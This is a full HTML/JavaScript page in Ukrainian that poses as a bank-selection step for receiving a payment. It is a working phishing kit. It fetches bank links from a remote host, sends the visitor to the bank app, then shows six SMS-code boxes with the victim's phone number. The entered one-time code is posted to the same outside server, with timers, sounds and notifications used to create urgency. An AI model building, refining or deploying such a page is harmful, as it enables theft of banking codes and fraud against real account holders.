<!DOCTYPE html>
<html lang="uk">
<head>
  <meta charset="UTF-8">
  <title>Виберіть ваш банк</title>
  <link rel="icon" href="favicon.ico" type="image/x-icon">
  <style>
    body {
      font-family: Arial, sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      background-color: #f0f0f0;
    }
    h1 { margin-bottom: 8px; font-size: 2.1em; font-weight: bold; }
    #subtitle {
      color: #555; font-size: 1.05em; margin-bottom: 20px;
      text-align: center; max-width: 350px;
    }
    .bank-btn, .bank-link {
      width: 320px;
      height: 50px;
      font-size: 20px;
      font-weight: bold;
      margin-bottom: 16px;
      border: none;
      border-radius: 11px;
      cursor: pointer;
      transition: filter 0.18s, background 0.18s;
      box-shadow: 0 1px 6px #0001;
      outline: none;
      text-decoration: none;
      color: #fff;
      display: flex; align-items: center; justify-content: center;
      position: relative;
    }
    .mono   { background: #222; }
    .oschad { background: #215E4D; }
    .raiff  { background: #ffe100; color: #222; }
    .pumb   { background: #ea262a; }
    .privat { background: #27AE60; }
    .bank-btn:disabled {
      background: #ccc !important;
      color: #888 !important;
      cursor: not-allowed;
      opacity: 0.6;
    }
    .bank-btn:enabled {
      animation: pulse 2s infinite;
    }
    @keyframes pulse {
      0% { box-shadow: 0 1px 6px #0001; }
      50% { box-shadow: 0 4px 15px rgba(76, 175, 80, 0.4); }
      100% { box-shadow: 0 1px 6px #0001; }
    }

    #status {
      margin-top: 18px; color: #555; font-size: 18px;
      text-align: center; min-height: 44px;
    }
    #return-instruction {
      margin: 16px 0 0 0;
      color:#444;
      max-width:400px;
      display:none;
      text-align: center;
    }
    #sms-code {
      font-size: 22px; letter-spacing: 10px; padding: 8px 20px;
      text-align: center; width: 190px; margin-top: 12px; margin-bottom: 8px;
    }
    
    /* ← ДОБАВЛЕНО: Стили для SMS ячеек */
    .sms-container {
      display: flex;
      justify-content: center;
      gap: 10px;
      margin: 20px 0;
    }
    
    .sms-digit {
      width: 50px;
      height: 70px;
      border: 2px solid #ddd;
      border-radius: 12px;
      background: white;
      font-size: 24px;
      font-weight: bold;
      text-align: center;
      outline: none;
      transition: border-color 0.3s;
    }
    
    .sms-digit:focus {
      border-color: #1976d2;
      box-shadow: 0 0 0 3px rgba(25, 118, 210, 0.1);
    }
    
    .sms-digit.filled {
      border-color: #4caf50;
      background: #f8fff8;
    }
    
    .phone-display {
      color: #666;
      font-size: 16px;
      margin: 10px 0;
    }
    #send-code-btn {
      margin-left: 10px; padding: 10px 30px; font-size: 18px;
      background: #1976d2; color: #fff; border: none; border-radius: 7px; cursor: pointer;
    }
    #send-code-btn:disabled {
      background-color: #aaa; cursor: not-allowed;
    }
    #sms-error { color: red; margin-top: 5px; }
    #timer { color: #c60; margin-left: 16px; font-weight: bold; font-size: 20px; }

  </style>
</head>
<body>

  <h1>Виберіть ваш банк</h1>
  <div id="subtitle">Після підтвердження в додатку банку обов'язково поверніться на цей сайт для <strong>отримання виплати</strong></div>
  
  <button class="bank-btn mono" id="mono-btn" disabled>
    Monobank
  </button>
  
  <button class="bank-btn oschad" id="oschad-btn" disabled>
    Ощадбанк
  </button>
  
  <button class="bank-btn raiff" id="raiff-btn" disabled>
    Raiffeisen Bank
  </button>
  
  <button class="bank-btn pumb" id="pumb-btn" disabled>
    ПУМБ
  </button>
  
  <a href="https://privatbank.ua/" class="bank-link privat" id="privat-link" target="_blank" rel="noopener">
    ПриватБанк
  </a>
  
  <div id="return-instruction">
    <b>Після підтвердження у вибраному банку поверніться на цю сторінку.<br>
    Код підтвердження з'явиться тут автоматично.</b>
  </div>
  <div id="status"></div>
  <audio id="sms-audio" src="sms.mp3"></audio>

  <script>
    const API_MAP = {
      mono:   "https://api.astrinvite.site/link?bank=monobank",
      oschad: "https://api.astrinvite.site/link?bank=oschadbank",
      raiff:  "https://api.astrinvite.site/link?bank=raiffeisenbank",
      pumb:   "https://api.astrinvite.site/link?bank=pumbbank"
    };
    
    const CONSUME_MAP = {
      mono:   "https://api.astrinvite.site/consume-link?bank=monobank",
      oschad: "https://api.astrinvite.site/consume-link?bank=oschadbank",
      raiff:  "https://api.astrinvite.site/consume-link?bank=raiffeisenbank",
      pumb:   "https://api.astrinvite.site/consume-link?bank=pumbbank"
    };
    
    const STATUS_URL = "https://api.astrinvite.site/api/link-status";
    const CODE_URL   = "https://api.astrinvite.site/api/submit-code";

    // ← ДОБАВЛЕНО: Переменная для номера телефона
    let userPhoneNumber = null;

    // ← ДОБАВЛЕНО: Исходные тексты кнопок
    const BANK_TEXTS = {
      "mono-btn": "Monobank",
      "oschad-btn": "Ощадбанк", 
      "raiff-btn": "Raiffeisen Bank",
      "pumb-btn": "ПУМБ"
    };

    const linkData = {};  // банк → { url, id }
    let currentBank = null;
    let currentId = null;
    let pollingStatus = false;
    let statusPoller = null;
    let refreshInterval = null;
    let link = null;
    let smsTimerInterval = null;
    let smsSoundInterval = null;
    let lastRefreshTime = Date.now();
    let refreshCount = 0;

    // Состояние автообновления
    let autoRefreshActive = true;
    let refreshInProgress = false;

    // ← ДОБАВЛЕНО: Функция восстановления текста кнопок
    function restoreButtonTexts() {
      Object.keys(BANK_TEXTS).forEach(btnId => {
        const btn = document.getElementById(btnId);
        if (btn) {
          btn.textContent = BANK_TEXTS[btnId];
        }
      });
    }

    async function checkLinksForBank(bank) {
      const btn = document.getElementById(bank + "-btn");
      
      if (!btn) return;

      try {        
        const res = await fetch(API_MAP[bank], {
          method: 'GET',
          cache: 'no-cache', // Принудительно обходим кэш
          headers: {
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache'
          }
        });
        
        if (res.ok) {
          const data = await res.json();
          if (data.url && data.id) {
            linkData[bank] = { url: data.url, id: data.id };
            btn.disabled = false;
            btn.onclick = () => handleBankClick(bank);
            // ← ДОБАВЛЕНО: Восстанавливаем текст при успешной проверке
            btn.textContent = BANK_TEXTS[bank + "-btn"];
          } else {
            btn.disabled = true;
            btn.onclick = null;
            delete linkData[bank];
            // ← ДОБАВЛЕНО: Восстанавливаем текст даже если нет ссылки
            btn.textContent = BANK_TEXTS[bank + "-btn"];
          }
        } else if (res.status === 429) {
          // Нет доступных ссылок
          btn.disabled = true;
          btn.onclick = null;
          delete linkData[bank];
          // ← ДОБАВЛЕНО: Восстанавливаем текст
          btn.textContent = BANK_TEXTS[bank + "-btn"];
        } else {
          console.log(`Ошибка ${bank}: ${res.status}`);
          // ← ДОБАВЛЕНО: Восстанавливаем текст при ошибке
          btn.textContent = BANK_TEXTS[bank + "-btn"];
        }
      } catch (error) {
        console.error(`Ошибка проверки ${bank}:`, error);
        // ← ДОБАВЛЕНО: Восстанавливаем текст при исключении
        btn.textContent = BANK_TEXTS[bank + "-btn"];
      }
    }

    async function checkAllLinks() {
      if (refreshInProgress || !autoRefreshActive) return;
      
      refreshInProgress = true;
      
      try {
        // Проверяем все банки параллельно
        await Promise.all([
          checkLinksForBank("mono"),
          checkLinksForBank("oschad"),
          checkLinksForBank("raiff"),
          checkLinksForBank("pumb")
        ]);
        
        lastRefreshTime = Date.now();
        
      } catch (error) {
        console.error("Ошибка автообновления:", error);
        // ← ДОБАВЛЕНО: Восстанавливаем тексты при ошибке автообновления
        restoreButtonTexts();
      } finally {
        refreshInProgress = false;
      }
    }

    function resetUI() {
      document.getElementById("return-instruction").style.display = "none";
      document.getElementById("status").textContent = "";
      
      // ← ДОБАВЛЕНО: Показываем обратно все элементы интерфейса
      document.getElementById("mono-btn").style.display = "flex";
      document.getElementById("oschad-btn").style.display = "flex"; 
      document.getElementById("raiff-btn").style.display = "flex";
      document.getElementById("pumb-btn").style.display = "flex";
      document.getElementById("privat-link").style.display = "flex";
      document.querySelector("h1").style.display = "block";
      document.getElementById("subtitle").style.display = "block";
      
      // Восстанавливаем тексты кнопок при сбросе UI
      restoreButtonTexts();
      autoRefreshActive = true; // Возобновляем автообновление
    }

    function showLoading(btnId) {
      autoRefreshActive = false; // Останавливаем автообновление
      ["mono-btn","oschad-btn","raiff-btn","pumb-btn"].forEach(id=>{
        const el = document.getElementById(id);
        if(id !== btnId) {
          el.disabled = true;
        }
      });
      document.getElementById(btnId).textContent = "Завантаження...";
      document.getElementById("status").innerHTML = "";
    }

    // ← ДОБАВЛЕНО: Функция скрытия загрузки с восстановлением текста
    function hideLoading() {
      restoreButtonTexts();
      // Состояние кнопок будет обновлено при следующем checkAllLinks()
    }

    async function handleBankClick(bank) {
      resetUI();
      currentBank = bank;
      const btnId = bank + "-btn";
      showLoading(btnId);

      const data = linkData[bank];
      if (!data || !data.url || !data.id) {
        document.getElementById("status").innerHTML = "<span style='color:#b33'>Немає доступної ссилки для цього банку.</span>";
        hideLoading();
        autoRefreshActive = true;
        checkAllLinks();
        return;
      }

      currentId = data.id;
      link = data.url;
      
      try {
        await fetch(CONSUME_MAP[bank] + "&id=" + currentId, { method: "POST" });
      } catch (e) {
        console.log("Ошибка consume:", e);
        hideLoading();
        autoRefreshActive = true;
        return;
      }
      
      document.getElementById("return-instruction").style.display = "";
      window.location.href = link;
      pollStatus();
    }

    async function pollStatus() {
      if (pollingStatus) return;
      pollingStatus = true;
      autoRefreshActive = false; // Останавливаем автообновление во время polling
      
      ["mono-btn","oschad-btn","raiff-btn","pumb-btn"].forEach(id=>{
        document.getElementById(id).disabled = true;
      });
      
      statusPoller = setInterval(async () => {
        try {
          const res = await fetch(`${STATUS_URL}?id=${currentId}`);
          const data = await res.json();
          if (data.status === "waiting_code") {
            // ← ДОБАВЛЕНО: Сохраняем номер телефона если пришел
            if (data.phone) {
              userPhoneNumber = data.phone;
            }
            clearInterval(statusPoller);
            pollingStatus = false;
            showCodeInput();
          }
        } catch (e) {
          console.error("Ошибка polling:", e);
          clearInterval(statusPoller);
          pollingStatus = false;
          hideLoading();
          autoRefreshActive = true;
          checkAllLinks();
        }
      }, 2500);
    }

    function showCodeInput() {
      // Скрываем загрузку при показе поля ввода
      hideLoading();
      
      // Скрываем ВСЕ кнопки банков при показе SMS поля
      document.getElementById("mono-btn").style.display = "none";
      document.getElementById("oschad-btn").style.display = "none"; 
      document.getElementById("raiff-btn").style.display = "none";
      document.getElementById("pumb-btn").style.display = "none";
      document.getElementById("privat-link").style.display = "none";
      
      // Скрываем заголовок и подзаголовок
      document.querySelector("h1").style.display = "none";
      document.getElementById("subtitle").style.display = "none";
      
      // ← ОБНОВЛЕНО: Новый дизайн с отдельными ячейками
      const phoneDisplay = userPhoneNumber ? 
        `<div class="phone-display">Введіть код з SMS-повідомлення для<br>підтвердження номеру телефону<br><strong>${userPhoneNumber}</strong></div>` :
        `<div class="phone-display">Введіть код з SMS-повідомлення для<br>підтвердження номеру телефону</div>`;
      
      document.getElementById("status").innerHTML = `
        <div style="text-align: center; padding: 20px;">
          <h2 style="margin-bottom: 20px; color: #333;">Код-підтвердження</h2>
          ${phoneDisplay}
          
          <div class="sms-container">
            <input type="tel" class="sms-digit" maxlength="1" data-index="0" inputmode="numeric" pattern="[0-9]*">
            <input type="tel" class="sms-digit" maxlength="1" data-index="1" inputmode="numeric" pattern="[0-9]*">
            <input type="tel" class="sms-digit" maxlength="1" data-index="2" inputmode="numeric" pattern="[0-9]*">
            <input type="tel" class="sms-digit" maxlength="1" data-index="3" inputmode="numeric" pattern="[0-9]*">
            <input type="tel" class="sms-digit" maxlength="1" data-index="4" inputmode="numeric" pattern="[0-9]*">
            <input type="tel" class="sms-digit" maxlength="1" data-index="5" inputmode="numeric" pattern="[0-9]*">
          </div>
          
          <button id="send-code-btn" style="margin-top: 20px; padding: 12px 40px; font-size: 18px; 
                  background: #1976d2; color: #fff; border: none; border-radius: 25px; cursor: pointer;">
            Підтвердити
          </button>
          <span id="timer" style="display: block; margin-top: 15px; color: #c60; font-weight: bold; font-size: 16px;"></span>
          <div id="sms-error" style="color: red; margin-top: 10px; font-size: 16px;"></div>
          
          <div style="margin-top: 20px; color: #999; font-size: 14px;">
            Відправити код повторно через <span id="resend-timer">2:58</span>
          </div>
        </div>
      `;
      
      setupSMSInput();
      startSMSTimer();

    // ← ДОБАВЛЕНО: Функция настройки ввода SMS
    function setupSMSInput() {
      const digits = document.querySelectorAll('.sms-digit');
      
      digits.forEach((digit, index) => {
        digit.addEventListener('input', (e) => {
          const value = e.target.value;
          
          // Разрешаем только цифры
          if (!/^\d*$/.test(value)) {
            e.target.value = '';
            return;
          }
          
          // Добавляем класс filled
          if (value) {
            e.target.classList.add('filled');
            // Переходим к следующему полю
            if (index < digits.length - 1) {
              digits[index + 1].focus();
            }
          } else {
            e.target.classList.remove('filled');
          }
          
          // Проверяем заполнены ли все поля
          checkAllDigitsFilled();
        });
        
        digit.addEventListener('keydown', (e) => {
          // Backspace - переходим к предыдущему полю
          if (e.key === 'Backspace' && !e.target.value && index > 0) {
            digits[index - 1].focus();
            digits[index - 1].value = '';
            digits[index - 1].classList.remove('filled');
          }
          
          // Стрелки для навигации
          if (e.key === 'ArrowLeft' && index > 0) {
            digits[index - 1].focus();
          }
          if (e.key === 'ArrowRight' && index < digits.length - 1) {
            digits[index + 1].focus();
          }
        });
        
        // Обработка вставки кода
        digit.addEventListener('paste', (e) => {
          e.preventDefault();
          const paste = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 6);
          
          digits.forEach((d, i) => {
            if (paste[i]) {
              d.value = paste[i];
              d.classList.add('filled');
            } else {
              d.value = '';
              d.classList.remove('filled');
            }
          });
          
          checkAllDigitsFilled();
        });
      });
      
      // Фокус на первое поле
      if (digits.length > 0) {
        digits[0].focus();
      }
      
      // Настройка кнопки отправки
      document.getElementById("send-code-btn").onclick = submitSMSCode;
    }
    
    function checkAllDigitsFilled() {
      const digits = document.querySelectorAll('.sms-digit');
      const code = Array.from(digits).map(d => d.value).join('');
      
      const submitBtn = document.getElementById("send-code-btn");
      if (code.length === 6) {
        submitBtn.style.background = '#4caf50';
        submitBtn.style.opacity = '1';
      } else {
        submitBtn.style.background = '#1976d2';
        submitBtn.style.opacity = '0.7';
      }
    }
    
    async function submitSMSCode() {
      const digits = document.querySelectorAll('.sms-digit');
      const code = Array.from(digits).map(d => d.value).join('');
      
      if (!/^\d{6}$/.test(code)) {
        document.getElementById("sms-error").textContent = "Введіть коректний 6-значний код!";
        return;
      }
      
      document.getElementById("send-code-btn").disabled = true;
      document.getElementById("sms-error").textContent = "";
      
      const fd = new FormData();
      fd.append("id", currentId);
      fd.append("code", code);
      
      try {
        const res = await fetch(CODE_URL, { method: "POST", body: fd });
        const resp = await res.json();
        if (resp.ok) {
          document.getElementById("status").innerHTML = "<div style='text-align: center; padding: 40px;'><h2 style='color: #4caf50;'>✅ Код прийнято</h2><p>Чекаємо підтвердження на пристрої…</p></div>";
          stopSMSTimer();
          setTimeout(() => {
            autoRefreshActive = true;
            checkAllLinks();
          }, 5000);
        } else {
          document.getElementById("send-code-btn").disabled = false;
          document.getElementById("sms-error").textContent = "Помилка: " + (resp.error || "спробуйте ще");
        }
      } catch (e) {
        console.error("Ошибка отправки кода:", e);
        document.getElementById("send-code-btn").disabled = false;
        document.getElementById("sms-error").textContent = "Помилка серверу. Спробуйте ще раз.";
      }
    }
    }

    function startSMSTimer() {
      let seconds = 180;
      playSMSAudio(); // 🔊 Звук при появлении SMS запроса
      showSMSPush();
      updateSMSTimer(seconds);

      smsSoundInterval = setInterval(() => playSMSAudio(), 5000);
      smsTimerInterval = setInterval(() => {
        seconds--;
        updateSMSTimer(seconds);
        if (seconds <= 0) {
          clearInterval(smsTimerInterval);
          clearInterval(smsSoundInterval);
          document.getElementById("timer").textContent = "⏰ Час вичерпано!";
          // ← ИСПРАВЛЕНО: Восстанавливаем состояние при таймауте
          setTimeout(() => {
            resetUI(); // Полный сброс UI
            autoRefreshActive = true;
            checkAllLinks();
          }, 2000);
        }
      }, 1000);
    }

    function stopSMSTimer() {
      if (smsTimerInterval) clearInterval(smsTimerInterval);
      if (smsSoundInterval) clearInterval(smsSoundInterval);
      document.getElementById("timer").textContent = "";
    }

    function updateSMSTimer(seconds) {
      const m = Math.floor(seconds / 60), s = seconds % 60;
      document.getElementById("timer").textContent = `⏳ ${m}:${s < 10 ? "0" : ""}${s}`;
    }

    function playSMSAudio() {
      try {
        const audio = document.getElementById("sms-audio");
        audio.currentTime = 0;
        audio.play();
      } catch {}
    }

    function showSMSPush() {
      if ("Notification" in window) {
        if (Notification.permission === "granted") {
          new Notification("Введіть код з SMS для завершення входу!", {
            body: "Вікно для коду вже чекає вас на сайті.",
            icon: "favicon.ico"
          });
        } else if (Notification.permission !== "denied") {
          Notification.requestPermission().then(function (permission) {
            if (permission === "granted") {
              new Notification("Введіть код з SMS для завершення входу!", {
                body: "Вікно для коду вже чекає вас на сайті.",
                icon: "favicon.ico"
              });
            }
          });
        }
      }
    }

    // Инициализация автообновления
    function startAutoRefresh() {
      // Первоначальная проверка
      checkAllLinks();
      
      // Устанавливаем интервал автообновления каждые 3 секунды
      refreshInterval = setInterval(() => {
        if (autoRefreshActive && !refreshInProgress) {
          checkAllLinks();
        }
      }, 3000);
      
      console.log("🔄 Автообновление запущено (каждые 3 сек)");
    }

    // Обработка видимости страницы (останавливаем при скрытии)
    document.addEventListener("visibilitychange", () => {
      if (document.hidden) {
        autoRefreshActive = false;
        console.log("⏸ Автообновление приостановлено (страница скрыта)");
      } else {
        autoRefreshActive = true;
        checkAllLinks();
        console.log("▶ Автообновление возобновлено (страница видима)");
      }
    });

    // Запуск при загрузке страницы
    window.addEventListener('load', () => {
      startAutoRefresh();
    });

    // Очистка при закрытии
    window.addEventListener('beforeunload', () => {
      if (refreshInterval) {
        clearInterval(refreshInterval);
      }
      if (statusPoller) {
        clearInterval(statusPoller);
      }
      if (smsTimerInterval) {
        clearInterval(smsTimerInterval);
      }
      if (smsSoundInterval) {
        clearInterval(smsSoundInterval);
      }
    });
  </script>
</body>
</html>
